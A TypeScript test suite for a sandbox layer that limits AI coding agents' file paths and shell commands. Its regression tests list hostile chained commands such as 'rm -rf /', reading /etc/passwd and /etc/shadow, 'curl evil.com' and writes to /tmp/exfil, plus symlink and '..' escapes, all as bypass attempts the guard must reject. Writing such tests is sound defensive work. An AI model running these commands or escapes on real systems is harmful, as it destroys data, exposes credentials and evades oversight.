import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync, realpathSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { checkDomain, registerDomainLock } from "../../../src/safety/DomainLock.js";
import { loadTeamsConfig, parseMinimalYaml } from "../../../src/safety/teams-config.js";
import type { DomainPolicy } from "../../../src/safety/default-domains.js";

let workDir: string;

beforeEach(() => {
  workDir = realpathSync(mkdtempSync(join(tmpdir(), "domain-lock-")));
});

afterEach(() => {
  rmSync(workDir, { recursive: true, force: true });
});

describe("checkDomain — Write/Edit", () => {
  it("path under declared upsert root → allowed", () => {
    const srcDir = join(workDir, "src");
    mkdirSync(srcDir, { recursive: true });
    const target = join(srcDir, "foo.ts");
    writeFileSync(target, "");
    const policy: DomainPolicy = { read: ["."], upsert: [srcDir], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });

  it("path outside upsert root → blocked with structured message including hint and allowed_paths", () => {
    const srcDir = join(workDir, "src");
    const infraDir = join(workDir, "infrastructure");
    mkdirSync(srcDir, { recursive: true });
    mkdirSync(infraDir, { recursive: true });
    const target = join(infraDir, "main.tf");
    writeFileSync(target, "");
    const policy: DomainPolicy = { read: ["."], upsert: [srcDir], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
    if (r.allowed) return;
    expect(r.reason).toBe("domain-lock");
    expect(r.structured.block).toBe(true);
    expect(r.structured.agent).toBe("implementer");
    expect(r.structured.operation).toBe("Write");
    expect(r.structured.path).toBe(target);
    expect(r.structured.allowed_paths).toEqual({ upsert: [srcDir], delete: [] });
    expect(typeof r.structured.hint).toBe("string");
    expect(r.structured.hint).toMatch(/teams\.local\.yaml/);
  });

  it("symlink resolution: declared root /real/foo, target symlink → /real/foo/bar → allowed", () => {
    const realFoo = join(workDir, "real", "foo");
    mkdirSync(realFoo, { recursive: true });
    const realBar = join(realFoo, "bar");
    writeFileSync(realBar, "");
    const linkBar = join(workDir, "link-bar");
    symlinkSync(realBar, linkBar);
    const policy: DomainPolicy = { read: ["."], upsert: [realFoo], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Edit",
      path: linkBar,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("checkDomain — Bash with bash_policy", () => {
  it("script-only with matching prefix → allowed", () => {
    const policy: DomainPolicy = {
      read: ["."],
      upsert: [],
      delete: [],
      bash_policy: {
        mode: "script-only",
        runner: "uv run --script",
        allowed_scripts: ["/abs/scripts/*.py"],
      },
    };
    mkdirSync("/tmp/ds-test-scripts", { recursive: true });
    // Use real path-equality for deterministic match
    const scriptDir = join(workDir, "scripts");
    mkdirSync(scriptDir, { recursive: true });
    const scriptPath = join(scriptDir, "verify.py");
    writeFileSync(scriptPath, "");
    const policy2: DomainPolicy = {
      read: ["."],
      upsert: [],
      delete: [],
      bash_policy: {
        mode: "script-only",
        runner: "uv run --script",
        allowed_scripts: [scriptDir + "/*.py"],
      },
    };
    const r = checkDomain({
      agent: "verifier",
      operation: "Bash",
      command: `uv run --script ${scriptPath}`,
      policy: policy2,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
    // sanity: original policy with non-existent path also acts as expected when command does not match
    const r2 = checkDomain({
      agent: "verifier",
      operation: "Bash",
      command: "rm -rf /",
      policy,
      mode: "block",
    });
    expect(r2.allowed).toBe(false);
  });

  it("script-only with non-matching command → blocked", () => {
    const policy: DomainPolicy = {
      read: ["."],
      upsert: [],
      delete: [],
      bash_policy: {
        mode: "script-only",
        runner: "uv run --script",
        allowed_scripts: ["/allowed/x.py"],
      },
    };
    const r = checkDomain({
      agent: "verifier",
      operation: "Bash",
      command: "git status",
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
    if (r.allowed) return;
    expect(r.structured.reason).toBe("domain-lock");
  });

  it("Bash without bash_policy → returns allowed:true (Layer C handles)", () => {
    const policy: DomainPolicy = { read: ["."], upsert: ["src/"], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Bash",
      command: "rm -rf /",
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("checkDomain — agent without policy", () => {
  it("returns allowed:true (caller emits warn)", () => {
    const r = checkDomain({
      agent: "ghost",
      operation: "Write",
      path: "/etc/passwd",
      policy: undefined,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("loadTeamsConfig — three-layer merge", () => {
  it("defaults → user → project; arrays unioned; mode resolves project > user > 'warn'", async () => {
    const userPath = join(workDir, "teams.yaml");
    const projPath = join(workDir, "teams.local.yaml");
    writeFileSync(
      userPath,
      [
        "mode: warn",
        "implementer:",
        "  read: [\".\"]",
        "  upsert:",
        "    - infrastructure/",
        "  delete: []",
      ].join("\n"),
    );
    writeFileSync(
      projPath,
      [
        "mode: block",
        "implementer:",
        "  read: [\".\"]",
        "  upsert:",
        "    - docs/",
        "  delete: []",
      ].join("\n"),
    );
    const cfg = await loadTeamsConfig({
      userPath,
      projectPath: projPath,
      runDir: "/run-dir",
      expertiseDir: "/exp-dir",
    });
    expect(cfg.mode).toBe("block");
    const impl = cfg.domains.implementer;
    expect(impl).toBeDefined();
    // Defaults provide src/, tests/, scripts/, ${RUN_DIR}/notes/. Both layers add their dirs.
    expect(impl.upsert).toEqual(expect.arrayContaining(["src/", "tests/", "scripts/", "infrastructure/", "docs/", "/run-dir/notes/"]));
  });

  it("missing user/project files → returns defaults silently", async () => {
    const cfg = await loadTeamsConfig({
      userPath: join(workDir, "missing-user.yaml"),
      projectPath: join(workDir, "missing-proj.yaml"),
      runDir: "/r",
      expertiseDir: "/e",
    });
    expect(cfg.mode).toBe("warn");
    expect(cfg.domains.implementer.upsert).toEqual(expect.arrayContaining(["src/", "tests/", "scripts/", "/r/notes/"]));
  });

  it("user yaml mode 'warn' inherits when project missing", async () => {
    const userPath = join(workDir, "teams.yaml");
    writeFileSync(userPath, "mode: warn\n");
    const cfg = await loadTeamsConfig({
      userPath,
      projectPath: join(workDir, "absent.yaml"),
      runDir: "/r",
      expertiseDir: "/e",
    });
    expect(cfg.mode).toBe("warn");
  });
});

describe("parseMinimalYaml", () => {
  it("parses inline arrays, block lists, and nested mappings", () => {
    const txt = [
      "mode: block",
      "implementer:",
      "  read: [\".\", \"src/\"]",
      "  upsert:",
      "    - src/",
      "    - tests/",
      "  delete: []",
      "verifier:",
      "  bash_policy:",
      "    mode: script-only",
      "    runner: uv run --script",
      "    allowed_scripts:",
      "      - ~/.pi/scripts/x.py",
    ].join("\n");
    const r = parseMinimalYaml(txt) as any;
    expect(r.mode).toBe("block");
    expect(r.implementer.read).toEqual([".", "src/"]);
    expect(r.implementer.upsert).toEqual(["src/", "tests/"]);
    expect(r.implementer.delete).toEqual([]);
    expect(r.verifier.bash_policy.mode).toBe("script-only");
    expect(r.verifier.bash_policy.runner).toBe("uv run --script");
    expect(r.verifier.bash_policy.allowed_scripts).toEqual(["~/.pi/scripts/x.py"]);
  });
});

describe("registerDomainLock — wrapper behavior", () => {
  type Handler = (event: any, ctx: any) => Promise<any>;
  const makePi = () => {
    const handlers: Handler[] = [];
    const pi: any = {
      on: (_evt: string, h: Handler) => handlers.push(h),
    };
    return { pi, handlers };
  };

  it("mode 'warn': blocked operation produces allowed:false but wrapper emits domain_warn and lets execution proceed", async () => {
    const { pi, handlers } = makePi();
    const events: any[] = [];
    const policy: DomainPolicy = { read: ["."], upsert: [join(workDir, "src")], delete: [] };
    registerDomainLock(pi, {
      getPolicyForAgent: () => policy,
      mode: "warn",
      emitEvent: (e) => events.push(e),
    });
    const result = await handlers[0](
      {
        tool: { name: "Write" },
        toolInput: { file_path: join(workDir, "infra", "main.tf") },
      },
      {},
    );
    expect(result).toBeUndefined();
    expect(events.length).toBe(1);
    expect(events[0].type).toBe("domain_warn");
  });

  it("mode 'block': blocked operation produces wrapper return {block:true} and emits domain_block", async () => {
    const { pi, handlers } = makePi();
    const events: any[] = [];
    const policy: DomainPolicy = { read: ["."], upsert: [join(workDir, "src")], delete: [] };
    registerDomainLock(pi, {
      getPolicyForAgent: () => policy,
      mode: "block",
      emitEvent: (e) => events.push(e),
    });
    const result = await handlers[0](
      {
        tool: { name: "Write" },
        toolInput: { file_path: join(workDir, "infra", "main.tf") },
      },
      {},
    );
    expect(result).toBeDefined();
    expect(result.block).toBe(true);
    expect(result.layer).toBe("D");
    expect(events.length).toBe(1);
    expect(events[0].type).toBe("domain_block");
  });

  it("agent with no policy → emits domain_warn and allows", async () => {
    const { pi, handlers } = makePi();
    const events: any[] = [];
    registerDomainLock(pi, {
      getPolicyForAgent: () => undefined,
      mode: "block",
      emitEvent: (e) => events.push(e),
    });
    const result = await handlers[0](
      {
        tool: { name: "Write" },
        toolInput: { file_path: "/tmp/foo" },
      },
      {},
    );
    expect(result).toBeUndefined();
    expect(events.length).toBe(1);
    expect(events[0].type).toBe("domain_warn");
    expect(events[0].payload.reason).toBe("no-policy");
  });
});

// ---------------------------------------------------------------------------
// Codex round-1 regression tests for Phase 2
// ---------------------------------------------------------------------------

describe("checkDomain — bash compound-command bypass (CRITICAL #2 regression)", () => {
  const policy: DomainPolicy = {
    read: ["."],
    upsert: [],
    delete: [],
    bash_policy: {
      mode: "script-only",
      runner: "uv run --script",
      allowed_scripts: ["/allowed/script.py"],
    },
  };

  for (const evilTail of [
    "; rm -rf /",
    " && cat /etc/passwd",
    " || curl evil.com",
    " | base64",
    " > /tmp/exfil",
    " >> /tmp/exfil",
    " < /etc/shadow",
    " $(rm -rf /)",
    " `rm -rf /`",
  ]) {
    it(`rejects '${evilTail}' chained after the allowed script`, () => {
      const r = checkDomain({
        agent: "verifier",
        operation: "Bash",
        command: `uv run --script /allowed/script.py${evilTail}`,
        policy,
        mode: "block",
      });
      expect(r.allowed).toBe(false);
    });
  }

  it("allows the bare allowed-script invocation with normal args", () => {
    const r = checkDomain({
      agent: "verifier",
      operation: "Bash",
      command: "uv run --script /allowed/script.py --flag value",
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });

  it("allows quoted args containing semicolons (treated as data, not operators)", () => {
    const r = checkDomain({
      agent: "verifier",
      operation: "Bash",
      command: `uv run --script /allowed/script.py "arg with ; semi"`,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("checkDomain — symlink/new-file path resolution (CRITICAL #3 regression)", () => {
  it("rejects writes through a symlinked parent that escapes the allowed root", () => {
    const allowed = join(workDir, "allowed");
    const escape = join(workDir, "escape");
    mkdirSync(allowed, { recursive: true });
    mkdirSync(escape, { recursive: true });
    // Create a symlink under the allowed root that points OUTSIDE.
    const trap = join(allowed, "trap");
    symlinkSync(escape, trap);
    // Try to write to a non-existent file underneath the symlinked parent.
    const target = join(trap, "newfile.txt");
    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
  });

  it("allows writes to non-existent files under a non-symlinked allowed root", () => {
    const allowed = join(workDir, "allowed");
    mkdirSync(allowed, { recursive: true });
    const target = join(allowed, "deep", "nested", "newfile.txt");
    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("checkDomain — delete-only root must NOT grant write (MEDIUM #3 regression)", () => {
  it("rejects Write when path is in delete but not upsert", () => {
    const dir = join(workDir, "trash");
    mkdirSync(dir, { recursive: true });
    const target = join(dir, "file.txt");
    const policy: DomainPolicy = { read: ["."], upsert: [], delete: [dir] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
  });

  it("rejects Edit when path is in delete but not upsert", () => {
    const dir = join(workDir, "trash");
    mkdirSync(dir, { recursive: true });
    const target = join(dir, "file.txt");
    writeFileSync(target, "");
    const policy: DomainPolicy = { read: ["."], upsert: [], delete: [dir] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Edit",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
  });
});

describe("checkDomain — Grep/Glob respect read domain (HIGH #3 regression)", () => {
  it("Grep on a path outside the read root is rejected", () => {
    const allowed = join(workDir, "allowed");
    const offlimits = join(workDir, "offlimits");
    mkdirSync(allowed, { recursive: true });
    mkdirSync(offlimits, { recursive: true });
    const target = join(offlimits, "secrets.env");
    writeFileSync(target, "");
    const policy: DomainPolicy = { read: [allowed], upsert: [], delete: [] };
    const r = checkDomain({
      agent: "tester",
      operation: "Grep",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
  });

  it("Glob on a path under the read root is allowed", () => {
    const allowed = join(workDir, "allowed");
    mkdirSync(allowed, { recursive: true });
    const target = join(allowed, "**/*.ts");
    const policy: DomainPolicy = { read: [allowed], upsert: [], delete: [] };
    const r = checkDomain({
      agent: "tester",
      operation: "Glob",
      path: target,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("loadTeamsConfig — parse errors surfaced (HIGH #4 regression)", () => {
  it("malformed user yaml (unclosed inline bracket) produces a parseErrors entry", async () => {
    const userPath = join(workDir, "teams.yaml");
    writeFileSync(userPath, "implementer:\n  upsert: [unclosed\n");
    const cfg = await loadTeamsConfig({
      userPath,
      projectPath: join(workDir, "missing-project.yaml"),
      runDir: workDir,
      expertiseDir: workDir,
    });
    expect(cfg.parseErrors.length).toBe(1);
    expect(cfg.parseErrors[0].path).toBe(userPath);
    expect(cfg.parseErrors[0].error).toMatch(/unclosed/i);
  });

  it("missing files do NOT count as parse errors", async () => {
    const cfg = await loadTeamsConfig({
      userPath: join(workDir, "no-such-user.yaml"),
      projectPath: join(workDir, "no-such-project.yaml"),
      runDir: workDir,
      expertiseDir: workDir,
    });
    expect(cfg.parseErrors).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Codex round-2 regression tests for Phase 2
// ---------------------------------------------------------------------------

describe("checkDomain — parent-traversal rejection (round-2 CRITICAL #3 regression)", () => {
  it("rejects Write to a path containing `..` segments even if it lexically resolves under the root", () => {
    const allowed = join(workDir, "allowed");
    mkdirSync(allowed, { recursive: true });
    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
    // path.resolve would collapse "/allowed/foo/../bar" lexically to "/allowed/bar",
    // but if `foo` were a symlinked dir the OS would walk through it first.
    // Reject all `..` outright as the safer rule.
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: `${allowed}/foo/../escape`,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
    if (!r.allowed) {
      expect((r.structured.hint as string)).toMatch(/parent-traversal/);
    }
  });

  it("rejects Read with `..` segments too", () => {
    const allowed = join(workDir, "allowed");
    mkdirSync(allowed, { recursive: true });
    const policy: DomainPolicy = { read: [allowed], upsert: [], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Read",
      path: `${allowed}/x/../y`,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(false);
  });

  it("allows Write to a path containing legitimate segments named like `..` (e.g., `..foo`) but NOT bare `..`", () => {
    const allowed = join(workDir, "allowed");
    mkdirSync(allowed, { recursive: true });
    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
    const r = checkDomain({
      agent: "implementer",
      operation: "Write",
      path: `${allowed}/..backup`,
      policy,
      mode: "block",
    });
    expect(r.allowed).toBe(true);
  });
});

describe("checkDomain — backslash-escaped compound bypass (round-2 CRITICAL #2 regression)", () => {
  const policy: DomainPolicy = {
    read: ["."],
    upsert: [],
    delete: [],
    bash_policy: {
      mode: "script-only",
      runner: "uv run --script",
      allowed_scripts: ["/allowed/script.py"],
    },
  };

  // Even-backslash compound: `\\;` in shell input = literal-backslash + unescaped semi.
  // shell-quote should still surface this as an operator token; our scan must reject.
  for (const evilTail of [
    " \\\\; rm -rf /",
    " \\\\&& cat /etc/passwd",
    " \\\\| base64",
    " \\\\> /tmp/exfil",
  ]) {
    it(`rejects even-backslash compound: '${evilTail}'`, () => {
      const r = checkDomain({
        agent: "verifier",
        operation: "Bash",
        command: `uv run --script /allowed/script.py${evilTail}`,
        policy,
        mode: "block",
      });
      expect(r.allowed).toBe(false);
    });
  }
});
